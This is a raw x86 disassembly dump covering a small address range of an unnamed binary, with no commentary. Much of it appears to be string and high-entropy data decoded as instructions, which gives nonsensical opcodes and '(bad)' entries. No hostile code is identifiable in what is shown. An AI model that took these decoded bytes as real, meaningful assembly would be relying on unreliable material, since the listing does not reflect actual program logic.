  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	push   esp
  413f01:	and    eax,0xd1dcaafc
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	fbstp  TBYTE PTR [edi+0x2fc7fce6]
  413f12:	stos   BYTE PTR es:[edi],al
  413f13:	cwde   
  413f14:	outs   dx,BYTE PTR ds:[esi]
  413f15:	out    0xa4,al
  413f17:	jmp    0x413f09
  413f19:	loop   0x413f4e
  413f1b:	hlt    
  413f1c:	xor    ch,BYTE PTR [edx]
  413f1e:	frstor [edi-0x50]
  413f21:	scas   al,BYTE PTR es:[edi]
  413f22:	or     DWORD PTR [ecx-0x63],0x1a84bf52
  413f29:	out    0x83,al
  413f2b:	mov    edx,0xc8e0961e
  413f30:	call   0xa251:0xbbc9063c
  413f37:	mov    ebp,0xcf529aae
  413f3c:	push   ds
  413f3d:	sahf   
  413f3e:	push   es
  413f3f:	cmp    al,0xe6
  413f41:	inc    ebp
  413f42:	jmp    0x413f14
  413f44:	cwde   
  413f45:	shl    BYTE PTR [esi],1
  413f47:	add    edx,DWORD PTR [edx-0x1886d108]
  413f4d:	jecxz  0x413faa
  413f4f:	jge    0x1ff7669d
  413f55:	dec    esp
  413f56:	fimul  DWORD PTR [eax-0x6e]
  413f59:	in     eax,0xc1
  413f5b:	inc    esi
  413f5c:	mov    dl,0xa
  413f5e:	popf   
  413f5f:	dec    edx
  413f60:	hlt    
  413f61:	and    ch,bh
  413f63:	lods   al,BYTE PTR ds:[esi]
  413f64:	into   
  413f65:	lahf   
  413f66:	jge    0x413f15
  413f68:	or     BYTE PTR [ebx+0x6c],0x3b
  413f6c:	xor    bl,BYTE PTR [eax-0x48d86f72]
  413f72:	adc    BYTE PTR [ebp-0x75],0xdf
  413f76:	and    BYTE PTR ds:0xbab4e2f1,dh
  413f7c:	clc    
  413f7d:	sbb    DWORD PTR [ecx+0x2d007ee4],edi
  413f83:	sbb    DWORD PTR [ebx-0x52],edi
  413f86:	xchg   edi,eax
  413f87:	pop    ecx
  413f88:	push   0xfffffff4
  413f8a:	lods   al,BYTE PTR ds:[esi]
  413f8b:	bound  esp,QWORD PTR [edi+0x74]
  413f8e:	popf   
  413f8f:	adc    eax,0x4b5644f6
  413f94:	push   ecx
  413f95:	in     al,0x3d
  413f97:	lods   al,BYTE PTR ds:[esi]
  413f98:	scas   al,BYTE PTR es:[edi]
  413f99:	push   es
  413f9a:	js     0x413fe5
  413f9c:	jp     0x413ff0
  413f9e:	xor    dl,BYTE PTR [ebp+0x32]
  413fa1:	inc    ecx
  413fa2:	xor    BYTE PTR [edi],ch
  413fa4:	xchg   ebp,eax
  413fa5:	pushf  
  413fa6:	je     0x413fff
  413fa8:	out    dx,al
  413fa9:	push   edi
  413faa:	cmp    ebx,edi
  413fac:	sbb    edi,esp
  413fae:	mov    esi,0xf9cdace
  413fb3:	(bad)  
  413fb5:	push   esp
  413fb6:	jbe    0x414007
  413fb8:	je     0x413fe9
  413fba:	add    edx,ebx
  413fbc:	aaa    
  413fbd:	adc    BYTE PTR [ecx],0x4a
  413fc0:	jmp    0x828b4495
  413fc5:	cmp    ah,cl
  413fc7:	imul   ebp,DWORD PTR [edi+0x461d2fbc],0x7afc6d75
  413fd1:	cwde   
  413fd2:	(bad)
  413fd6:	mov    ds:0xb64deba4,al
  413fdb:	popa   
  413fdc:	mov    ah,0xd7
  413fde:	adc    cl,BYTE PTR [ecx]
  413fe0:	mov    cs:0xe5e3000d,eax
  413fe6:	push   DWORD PTR [ebp-0x41590df7]
  413fec:	xor    eax,0x4b5d5bf5
  413ff1:	aam    0x84
  413ff3:	sbb    eax,0x957318ed
  413ff8:	cmc    
  413ff9:	hlt    
  413ffa:	xchg   edx,eax
  413ffb:	call   0x33933df2
  414000:	call   0xe146:0x16b7f5b3
  414007:	push   eax
  414008:	lods   eax,DWORD PTR ds:[esi]
  414009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41400a:	fld    DWORD PTR [edi-0x4af0c06]
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x5929:0x6ad52e96
  414083:	and    ah,al
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	lahf   
  41408d:	cdq    
  41408e:	das    
  41408f:	ins    BYTE PTR es:[edi],dx
  414090:	jno    0x4140aa
  414092:	fcom   DWORD PTR [ebx-0x79]
  414095:	sar    BYTE PTR [esi],0xec
  414098:	mov    WORD PTR [eax-0x1c7ec976],?
  41409e:	xchg   ecx,eax
  41409f:	jp     0x4140df
  4140a1:	loope  0x41408a
  4140a3:	push   es
  4140a4:	ds xchg ecx,eax
  4140a6:	xchg   edx,eax
  4140a7:	jnp    0x414079
  4140a9:	pushf  
  4140aa:	adc    eax,0xb7949705
  4140af:	not    DWORD PTR [edi+0x58]
  4140b2:	lea    ecx,[ecx-0x20fbc5ce]
  4140b8:	sbb    eax,0xfbf829ef
  4140bd:	sub    eax,0x35e34423
  4140c2:	out    0xa4,eax
  4140c4:	push   0xffffffdd
  4140c6:	fld    DWORD PTR [ebp-0x4ae99832]
  4140cc:	pop    edx
  4140cd:	cwde   
  4140ce:	scas   al,BYTE PTR es:[edi]
  4140cf:	or     BYTE PTR [edx+0x4c],bh
  4140d2:	test   DWORD PTR ds:0x8e65fffd,0xdd128a18
  4140dc:	sbb    bh,BYTE PTR [ebx]
  4140de:	std    
  4140df:	fcmovb st,st(1)
  4140e1:	jle    0x4140ba
  4140e3:	in     al,0x68
  4140e5:	bound  eax,QWORD PTR [eax+0x67]
  4140e8:	popa   
  4140e9:	fidivr WORD PTR [edx-0x1b1651a1]
  4140ef:	dec    edi
  4140f0:	ror    DWORD PTR [ebp+0x7d1807d0],1
  4140f6:	retf   
  4140f7:	mov    eax,ds:0xaa04ba76
  4140fc:	inc    edx
  4140fd:	mov    es,esp
  4140ff:	ins    DWORD PTR es:[edi],dx
  414100:	mov    bh,0xac
  414102:	and    eax,ecx
  414104:	push   esp
  414105:	add    al,0x86
  414107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414108:	mov    edi,0x1aad10e5
  41410d:	mov    al,ds:0xfdf9ed61
  414112:	mov    ebp,0xd3872fd0
  414117:	and    esi,esp
  414119:	fisubr DWORD PTR [edx]
  41411b:	mov    DWORD PTR gs:[ecx],eax
  41411e:	jmp    0x414111
  414120:	cmp    bh,BYTE PTR [ebp-0x2d]
  414123:	fld    TBYTE PTR [eax+0x32d4f1ee]
  414129:	push   ss
  41412a:	out    0x1,eax
  41412c:	lods   eax,DWORD PTR ds:[esi]
  41412d:	stc    
  41412e:	fcmovne st,st(3)
  414130:	pop    edi
  414131:	mov    esp,0xf5b0aaae
  414136:	das    
  414137:	mov    esp,0xcb13ab55
  41413c:	setge  BYTE PTR [ecx]
  41413f:	or     eax,0x47055eee
  414144:	cld    
  414145:	sbb    eax,0xbfe73e56
  41414a:	loope  0x41413a
  41414c:	sbb    DWORD PTR [esp+ebx*8],esi
  41414f:	enter  0xea36,0x33
  414153:	enter  0xb2ad,0x96
  414157:	mov    fs,WORD PTR [esi]
  414159:	in     eax,0xdc
  41415b:	not    DWORD PTR [ebx]
  41415d:	lods   eax,DWORD PTR ds:[esi]
  41415e:	or     bh,BYTE PTR ds:0x83a4d834
  414164:	mov    al,ds:0xe153612b
  414169:	shr    bl,0x6
  41416c:	ficomp DWORD PTR [edx-0x3291760e]
  414172:	test   BYTE PTR ds:0x9a52682e,bl
  414178:	outs   dx,BYTE PTR ds:[esi]
  414179:	or     edi,edi
  41417b:	pop    ecx
  41417c:	jmp    0x32870d5
  414181:	sbb    dl,dl
  414183:	adc    edi,DWORD PTR [edi-0x3ccae9fe]
  414189:	sub    edi,DWORD PTR [ebx+0x56]
  41418c:	sbb    DWORD PTR [edx],edi
  41418e:	ror    DWORD PTR [edx+0x0],1
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	dec    edi
  414201:	and    BYTE PTR [ecx+0x6c],ah
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	pop    eax
  41420d:	das    
  41420e:	add    DWORD PTR [ecx],edx
  414210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414211:	and    DWORD PTR [eax+0x14],esp
  414214:	dec    ebp
  414215:	xor    dh,ch
  414217:	cs int 0x8b
  41421a:	adc    bl,BYTE PTR [edi]
  41421c:	inc    esi
  41421d:	sar    BYTE PTR [edx+0xe],1
  414220:	ss pop es
  414222:	shr    DWORD PTR [eax-0x7068feb6],0xa3
  414229:	xchg   BYTE PTR [ebp+0x7a737eca],bl
  41422f:	inc    eax
  414230:	sbb    DWORD PTR [ebx-0x6dfd49f8],edi
  414236:	cmp    bh,BYTE PTR [edi+0x49]
  414239:	ficomp DWORD PTR [ebx+0x1d]
  41423c:	pop    edx
  41423d:	jecxz  0x414238
  41423f:	into   
  414240:	push   edi
  414241:	cmp    al,0xb
  414243:	ja     0x414202
  414245:	aad    0x32
  414247:	daa    
  414248:	sbb    al,0x46
  41424a:	mov    ebx,0xebc971f9
  41424f:	push   ecx
  414250:	arpl   WORD PTR [eax+ecx*8+0x52],bp
  414254:	fwait
  414255:	and    ah,BYTE PTR [eax+0x3ff04ba8]
  41425b:	out    dx,eax
  41425c:	ins    BYTE PTR es:[edi],dx
  41425d:	pop    es
  41425e:	push   ds
  41425f:	or     al,0x42
  414261:	ins    DWORD PTR es:[edi],dx
  414262:	pop    edx
  414263:	xor    bl,bl
  414265:	fsub   QWORD PTR [ebp+0xd]
  414268:	int    0x26
  41426a:	neg    al
  41426c:	call   0xafbc48ec
  414271:	imul   eax,eax,0xeb774512
  414277:	neg    DWORD PTR [eax+0x54]
  41427a:	adc    bl,dl
  41427c:	push   ebx
  41427d:	mov    ecx,0x91d50020
  414282:	dec    edx
  414283:	mov    edx,0x61ef9d75
  414288:	aam    0x10
  41428a:	push   edx
  41428b:	rol    ah,0x51
  41428e:	xor    ah,dl
  414290:	push   ss
  414291:	mov    ds:0x25f08383,eax
  414296:	repnz retf 0x867e
  41429a:	cmc    
  41429b:	mov    eax,0x848ae994
  4142a0:	(bad)  
  4142a1:	lahf   
  4142a2:	sbb    eax,0xa5d2485d
  4142a7:	add    BYTE PTR [ecx+0x3adffd7b],dl
  4142ad:	(bad)  
  4142ae:	sbb    eax,0xdc39692a
  4142b3:	sub    eax,0xc36f7b0b
  4142b8:	pusha  
  4142b9:	fcmovb st,st(5)
  4142bb:	inc    edi
  4142bc:	fdiv   DWORD PTR [ebx-0x29]
  4142bf:	stos   BYTE PTR es:[edi],al
  4142c0:	repz cwde 
  4142c2:	scas   eax,DWORD PTR es:[edi]
  4142c3:	mov    esp,DWORD PTR [ebp-0xf]
  4142c6:	xlat   BYTE PTR ds:[ebx]
  4142c7:	xchg   ecx,eax
  4142c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c9:	addr16 shl eax,1
  4142cc:	mov    ebx,0x72e1ddc4
  4142d1:	scas   eax,DWORD PTR es:[edi]
  4142d2:	loopne 0x414312
  4142d4:	out    0x26,eax
  4142d6:	mov    cl,0x1a
  4142d8:	adc    bh,BYTE PTR [ebx+0x53ade12d]
  4142de:	loopne 0x4142c9
  4142e0:	fcom   QWORD PTR ds:[esi]
  4142e3:	inc    edi
  4142e4:	jl     0x41434f
  4142e6:	or     eax,0x524e3a89
  4142eb:	mov    bl,0x5b
  4142ed:	lds    eax,FWORD PTR [ebx+0x42e9defd]
  4142f3:	ss out dx,al
  4142f5:	rcr    DWORD PTR [ecx+esi*2],0x65
  4142f9:	sub    dh,BYTE PTR [edi+edx*1]
  4142fc:	ins    DWORD PTR es:[edi],dx
  4142fd:	mov    eax,0x4f464ebb
  414302:	inc    BYTE PTR [ebp+0x4e]
  414305:	call   FWORD PTR [esi+0x696dfc6f]
  41430b:	inc    eax
  41430c:	pop    esp
  41430d:	adc    al,BYTE PTR [edx+0xe8]
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	pop    ss
  414381:	ja     0x4143f2
  414383:	stc    
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    BYTE PTR [edx+0x21bf6fbe],al
  414391:	nop
  414392:	mov    dl,BYTE PTR [ecx+0x53]
  414395:	sbb    al,0x6e
  414397:	and    al,cl
  414399:	pop    ebp
  41439a:	fwait
  41439b:	xor    edi,DWORD PTR [edx-0x61e9093b]
  4143a1:	(bad)  
  4143a2:	jmp    0xe8f4:0x29c3c108
  4143a9:	fiadd  WORD PTR [ecx-0x4ade9219]
  4143af:	push   ecx
  4143b0:	mov    al,ds:0xc3b474e2
  4143b5:	mov    ds,WORD PTR [eax-0x24e6869]
  4143bb:	xor    al,0x66
  4143bd:	mov    bl,0x41
  4143bf:	adc    DWORD PTR ds:0x48a6df3c,edi
  4143c5:	or     al,0xc7
  4143c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c8:	dec    ebx
  4143c9:	leave  
  4143ca:	adc    eax,0x9628c160
  4143cf:	clc    
  4143d0:	push   eax
  4143d1:	ss push es
  4143d3:	(bad)  
  4143d4:	xor    al,0xd6
  4143d6:	dec    esp
  4143d7:	sti    
  4143d8:	mov    bh,BYTE PTR [edi+0xed6756]
  4143de:	sub    ch,BYTE PTR [eax]
  4143e0:	lock and eax,0x8bacb49e
  4143e6:	jle    0x414445
  4143e8:	xchg   ebx,eax
  4143e9:	sub    BYTE PTR [eax+0x3910cc06],bl
  4143ef:	jge    0x414452
  4143f1:	sbb    ebx,ebx
  4143f3:	add    al,0x42
  4143f5:	mov    bl,0x92
  4143f7:	mov    dh,0xf9
  4143f9:	fdivr  st(6),st
  4143fb:	mov    eax,0xb87720a8
  414400:	ds ret 
  414402:	pop    ss
  414403:	ret    0x42b2
  414406:	mov    ch,0xcd
  414408:	nop
  414409:	repz lahf 
  41440b:	out    0x6f,al
  41440d:	cld    
  41440e:	mov    DWORD PTR [edi+0x5c],edi
  414411:	dec    ebx
  414412:	jmp    0x414476
  414414:	fdivr  DWORD PTR [edx-0x370a3fe]
  41441a:	stos   BYTE PTR es:[edi],al
  41441b:	fimul  DWORD PTR [ebx-0x67]
  41441e:	lea    edi,[edi-0x3c94b6af]
  414424:	(bad)  
  414425:	jae    0x414410
  414427:	push   ebp
  414428:	js     0x4144a9
  41442a:	rcr    DWORD PTR [ebx+0x5c9187aa],1
  414430:	test   esi,ebp
  414432:	xchg   dh,al
  414434:	sahf   
  414435:	push   eax
  414436:	cld    
  414437:	popf   
  414438:	pop    eax
  414439:	add    al,0x6a
  41443b:	test   eax,0x45fc5e93
  414440:	xor    eax,0xdd26baf
  414445:	add    eax,0xb0256e3b
  41444a:	fld    DWORD PTR [eax-0x2c]
  41444d:	gs pop ebx
  41444f:	mov    cl,0xf8
  414451:	jl     0x4143f7
  414453:	jo     0x414412
  414455:	jg     0x4144ca
  414457:	xor    eax,0x1055e4eb
  41445c:	sbb    ecx,DWORD PTR es:[ecx-0x87b4094]
  414463:	cmc    
  414464:	add    eax,0xa00561a9
  414469:	or     eax,0xc650713e
  41446e:	adc    al,BYTE PTR ds:0xaed8f439
  414474:	sub    dl,BYTE PTR [ecx+edi*8+0x1b2acee6]
  41447b:	imul   esi,DWORD PTR ss:[ebp+0x27c76577],0x9f82590
  414486:	retf   
  414487:	mov    eax,0x7ccba229
  41448c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448d:	call   0x41a17a
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x2]
  414501:	dec    esp
  414502:	inc    edx
  414503:	adc    esp,ebp
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	xor    ebx,edx
  41450e:	out    0x53,al
  414510:	sbb    al,0x71
  414512:	mul    DWORD PTR [edi+0x78dcf6dc]
  414518:	scas   al,BYTE PTR es:[edi]
  414519:	call   0xe54e419b
  41451e:	jne    0x414581
  414520:	shl    DWORD PTR [edi-0x788492ec],0xf9
  414527:	aam    0x77
  414529:	mov    ebp,eax
  41452b:	scas   eax,DWORD PTR es:[edi]
  41452c:	mov    eax,0x4b972e8a
  414531:	sub    cl,BYTE PTR [esi]
  414533:	mov    cl,0xb2
  414535:	cdq    
  414536:	or     edx,esi
  414538:	js     0x414517
  41453a:	push   esp
  41453b:	pusha  
  41453c:	sub    eax,0xa88497e0
  414541:	add    dh,al
  414543:	aam    0xe6
  414545:	or     al,0x23
  414547:	pop    ecx
  414548:	and    eax,0xc52afa2a
  41454d:	nop
  41454e:	int    0x99
  414550:	push   ebp
  414551:	ins    DWORD PTR es:[edi],dx
  414552:	cli    
  414553:	call   0xa33c:0x88162e59
  41455a:	pop    esi
  41455b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455c:	inc    eax
  41455d:	inc    ebx
  41455e:	sbb    DWORD PTR [edx-0xb],edi
  414561:	sub    edx,DWORD PTR [ecx-0x29ea4fd1]
  414567:	mov    ds:0xc20dedeb,eax
  41456c:	push   ebx
  41456d:	jne    0x414582
  41456f:	sbb    BYTE PTR [esi-0x7cc712cf],ah
  414575:	mov    dl,bl
